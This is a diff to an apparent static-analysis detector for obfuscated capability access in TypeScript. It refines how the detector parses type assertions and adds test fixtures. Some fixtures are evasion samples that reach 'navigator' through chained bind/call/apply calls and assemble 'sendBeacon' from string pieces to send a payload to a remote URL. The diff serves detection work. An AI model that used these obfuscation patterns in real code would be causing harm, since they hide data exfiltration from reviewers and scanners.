@@ -839,6 +839,26 @@ function hasAliasedComputedCapabilityLookup(content) {
               "any", "bigint", "boolean", "const", "false", "never", "null", "number", "object",
               "string", "symbol", "this", "true", "undefined", "unknown", "void"
             ]);
+            const isGenericFunctionTypeOpening = (opening) => {
+              let depth = 1;
+              for (let index = opening + 1; index < receiver.length; index += 1) {
+                if (receiver[index]?.value === "<") depth += 1;
+                else if (receiver[index]?.value === ">" && receiver[index - 1]?.value !== "=") {
+                  depth -= 1;
+                  if (depth !== 0) continue;
+                  if (receiver[index + 1]?.value !== "(") return false;
+                  let parentheses = 1;
+                  let afterParameters = index + 2;
+                  for (; afterParameters < receiver.length && parentheses > 0; afterParameters += 1) {
+                    if (receiver[afterParameters]?.value === "(") parentheses += 1;
+                    else if (receiver[afterParameters]?.value === ")") parentheses -= 1;
+                  }
+                  return parentheses === 0 && receiver[afterParameters]?.value === "="
+                    && receiver[afterParameters + 1]?.value === ">";
+                }
+              }
+              return false;
+            };
             for (let receiverIndex = 0; receiverIndex < receiver.length; receiverIndex += 1) {
               const value = receiver[receiverIndex]?.value;
               if (value === "(") parenthesesDepth += 1;
@@ -852,8 +872,10 @@ function hasAliasedComputedCapabilityLookup(content) {
                 typeReferenceCanAcceptArguments = false;
               } else if (inTypeAssertion && angleDepth === 0 && receiver[receiverIndex]?.type === "identifier") {
                 typeReferenceCanAcceptArguments = !primitiveTypeNames.has(value);
-              } else if (value === "<" && (angleDepth > 0
-                || (inTypeAssertion && typeReferenceCanAcceptArguments))) angleDepth += 1;
+              } else if (value === "<" && (angleDepth > 0 || (inTypeAssertion
+                && (typeReferenceCanAcceptArguments || isGenericFunctionTypeOpening(receiverIndex))))) {
+                angleDepth += 1;
+              }
               else if (value === "<" && inTypeAssertion) {
                 inTypeAssertion = false;
                 typeReferenceCanAcceptArguments = false;
@@ -873,10 +895,29 @@ function hasAliasedComputedCapabilityLookup(content) {
               normalizing = true;
             }
           }
-          const isExplicitFunction = receiver.some((token) => token.value === "function")
-            || receiver.some((token, receiverIndex) => token.value === "="
-              && receiver[receiverIndex + 1]?.value === ">");
-          const referencesCapability = receiver.some((token) => token.type === "identifier"
+          let runtimeReceiverEnd = receiver.length;
+          let runtimeParentheses = 0;
+          let runtimeBrackets = 0;
+          let runtimeBraces = 0;
+          for (let index = 0; index < receiver.length; index += 1) {
+            const value = receiver[index]?.value;
+            if (value === "(") runtimeParentheses += 1;
+            else if (value === ")") runtimeParentheses = Math.max(0, runtimeParentheses - 1);
+            else if (value === "[") runtimeBrackets += 1;
+            else if (value === "]") runtimeBrackets = Math.max(0, runtimeBrackets - 1);
+            else if (value === "{") runtimeBraces += 1;
+            else if (value === "}") runtimeBraces = Math.max(0, runtimeBraces - 1);
+            else if (["as", "satisfies"].includes(value) && runtimeParentheses === 0
+              && runtimeBrackets === 0 && runtimeBraces === 0) {
+              runtimeReceiverEnd = index;
+              break;
+            }
+          }
+          const runtimeReceiver = receiver.slice(0, runtimeReceiverEnd);
+          const isExplicitFunction = runtimeReceiver.some((token) => token.value === "function")
+            || runtimeReceiver.some((token, receiverIndex) => token.value === "="
+              && runtimeReceiver[receiverIndex + 1]?.value === ">");
+          const referencesCapability = runtimeReceiver.some((token) => token.type === "identifier"
             && (capabilityAliases.has(token.value) || capabilityMethodAliases.has(token.value)));
           return isExplicitFunction && !referencesCapability;
         };
@@ -1512,6 +1553,7 @@ for (const fixture of [
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const member = "bind"; const nav = Source.getNavigator[member].apply.call(Source.getNavigator[member], Source.getNavigator, [Source])().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const replacement = Source.getNavigator; const nav = Source.getNavigator.call.apply((() => null, replacement), []); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const replacement = Source.getNavigator; const nav = Source.getNavigator.call.apply(replacement as Replacement<string, () => any>, []); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static getNavigator() { return navigator; } } const replacement = Source.getNavigator; const nav = Source.getNavigator.call.apply((replacement as <T, U>() => any), [null]); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source).bind(null)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind?.(Source)?.call?.(null).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
@@ -1668,6 +1710,7 @@ for (const fixture of [
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.bind(() => null)(); value[key]();', path: "apps/worker/src/safe-function.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply(() => () => ({ safe() {} }), [])(); value[key]();', path: "apps/worker/src/safe-function.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply((() => null) as Replacement<string, () => any>, []); value[key]();', path: "apps/worker/src/safe-function.ts" },
+  { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply((() => null) as <T, U>() => any, []); value[key]();', path: "apps/worker/src/safe-function.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply((Number(Source.getNavigator) < 1, () => () => safeValue), [])(); value[key]();', path: "apps/worker/src/safe-function.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply((0 as number, Number(Source.getNavigator) < 1, () => () => safeValue), [])(); value[key]();', path: "apps/worker/src/safe-function.ts" },
   { content: 'class Source { static getNavigator() { return navigator; } } const value = Source.getNavigator.call.apply((Number(Source.getNavigator) as number < 1, () => () => (1 > 0 ? safeA : safeB)), [])(); value[key]();', path: "apps/worker/src/safe-function.ts" },
